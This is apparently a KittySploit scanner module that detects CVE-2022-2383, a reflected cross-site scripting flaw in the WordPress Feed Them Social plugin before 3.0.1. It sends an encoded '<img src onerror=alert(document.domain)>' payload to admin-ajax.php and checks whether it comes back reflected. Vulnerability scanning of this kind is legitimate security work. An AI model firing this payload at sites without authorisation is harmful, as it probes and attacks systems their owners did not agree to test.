#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Feed Them Social plugin before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Feed Them Social <3.0.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Feed Them Social plugin before 3.0.1 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape a parameter before outputting it back in the page.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp', 'wordpress', 'wp-plugin', 'wpscan', 'xss', 'slickremix', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/4a3b3023-e740-411c-a77c-6477b80d7531',
            'https://wordpress.org/plugins/feed-them-social/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-2383',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-2383',
    }

    def run(self):
        path = '/wp-content/plugins/feed-them-social/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Feed Them Social', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-admin/admin-ajax.php?action=fts_refresh_token_ajax&feed=instagram&expires_in=%3Cimg%20src%20onerror%3Dalert%28document.domain%29%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<img src onerror=alert(document.domain)><br/>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Feed Them Social <3.0.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

